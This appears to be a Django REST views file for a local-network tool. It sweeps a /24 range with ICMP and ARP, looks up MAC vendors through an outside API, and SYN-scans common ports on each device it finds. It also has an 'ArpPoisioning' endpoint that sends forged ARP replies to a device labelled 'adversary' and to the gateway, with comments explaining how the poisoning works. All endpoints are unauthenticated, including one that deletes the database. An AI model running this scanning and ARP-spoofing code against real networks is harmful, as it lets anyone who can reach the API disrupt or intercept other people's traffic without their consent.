import scapy.all as scapy
import requests
from ipaddress import IPv4Network
from .models import Device
from django.shortcuts import get_object_or_404
from rest_framework.decorators import api_view
from rest_framework.response import Response
from .serializers import DeviceSerializer 
from rest_framework import status
from django.utils import timezone
import concurrent.futures
import json
import os
from itertools import repeat

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,62078,8009,9080,1080,9000,88]

@api_view(['GET'])
def DeviceList(request):
    devices = Device.objects.all()
    serializer = DeviceSerializer(devices, many=True)
    return Response(serializer.data)

def PortScanner(device):
    src_port = 56235
    open_ports = ""
    for port in COMMON_PORTS:
        response = scapy.sr1(scapy.IP(dst=device.ip)/scapy.TCP(sport=src_port, dport=port, flags="S"), timeout=1)
        if(response != None and response.getlayer(scapy.TCP).flags == "SA"):
            # TCP:RA --> CLOSED
            # TCP:SA --> OPEN (SYN-ACK)
            open_ports += str(port) + "|"
    port_device = Device.objects.get(ip=str(device.ip))
    port_device.open_ports = open_ports
    port_device.save()
    
def DeviceThreadedScanner(in_ip, defaultGateway):
    ip = defaultGateway+str(in_ip)

    response = scapy.sr1(scapy.IP(dst=(ip))/scapy.ICMP(),timeout=1, verbose=0)
    if(response is None):
        print(f"{ip} is not up")
    else:
        print(f"{ip} is up") 

        # create or update device 
        obj, created = Device.objects.get_or_create(ip=str(ip))
        if created == False:
            # Update last seen 
            obj.last_seen = timezone.localtime(timezone.now())
            obj.save()

        # ARP SCAN
        response, unanswered = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=(ip)),timeout=1)
        if(response != None):
            try:
                device = Device.objects.get(ip=str(ip))
                device.mac = response[0][1].hwsrc
                device.save()

                # Get and Set MAC vendor in the database
                print(device.mac)
                GetMacVendor(device.mac)
            except Device.DoesNotExist:
                device = None
        
        


@api_view(['GET'])
def DeviceScan(request):
    gateway = GetDefaultGatewayFromConfig()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(DeviceThreadedScanner, list(range(256)), repeat(gateway))

    allDevices = Device.objects.all()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(PortScanner, allDevices)
    return Response(status.HTTP_200_OK)


@api_view(['POST'])
def UpdateAlias(request):
    serializer = DeviceSerializer(data=request.data)
    print(request.data)
    print(request.data["ip"])
    if serializer.is_valid():
        device = Device.objects.get(ip=request.data["ip"])
        device.alias = request.data["alias"]
        device.save()
    return Response(serializer.data)

@api_view(['POST'])
def UpdateGateway(request):
    print(request.data['gateway'])
    dirname = os.path.dirname(__file__)
    filename = os.path.join(dirname, '../../config.json')
    data = {'settings': [{'default_gateway':request.data['gateway']}]}
    json_string = json.dumps(data)
    with open(filename,'w') as f:
        f.write(json_string)
    return Response(status=200)

@api_view(['POST'])
def ArpPoisioning(request):
    adversary_mac = (request.data["adversary_mac"])
    adversary_ip = (request.data["adversary_ip"])
    gateway_ip = (request.data["gateway"])
    gateway = Device.objects.get(ip=gateway_ip)
    gateway_mac = (gateway.mac)

    print(gateway_mac)
    print(gateway_ip)
    print(adversary_ip)
    print(adversary_mac)

    # pdst = destination ip
    # hwdst = destination mac
    # psrc = source ip

    # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
    adversaryARP_packet = scapy.ARP(pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
    scapy.send(adversaryARP_packet)

    # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
    gatewayARP_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
    scapy.send(gatewayARP_packet)

    # (Note): The ARP Packet will contain the hwsrc of the computer that the ARP packet is being sent from.
    # ARP PACKET
        # pdst = Destination IP
        # psrc = Source IP
        # hwdst = Desination MAC
        # hwsrc = Source MAC (This is not explicitly set in the packet, but it will be set to the MAC address of the computer sending the ARP packet)
    # Since ARP will resolve IP addresses to MAC addresses, the ARP packet will make the recipient think that that the IP address of psrc belongs to the MAC address of hwsrc. That's how the attack works.

    return Response(status=200)

@api_view(['DELETE'])
def DeleteDatabase(self):
    Device.objects.all().delete()
    return Response(status=200)


def GetDefaultGatewayFromConfig():
    dirname = os.path.dirname(__file__)
    filename = os.path.join(dirname, '../../config.json')
    with open(filename,'r') as f:
        data = json.load(f)
        gateway = data["settings"][0]["default_gateway"]
        lastIndex = gateway.rfind('.')
        return gateway[:lastIndex]+'.'

def GetMacVendor(mac_address):
    url = "https://api.macvendors.com/"
    response = requests.get(url+mac_address)
    print(response)
    if(response.status_code == 200):
        device = Device.objects.get(mac=str(mac_address))
        device.mac_vendor = response.content.decode()
        device.save()

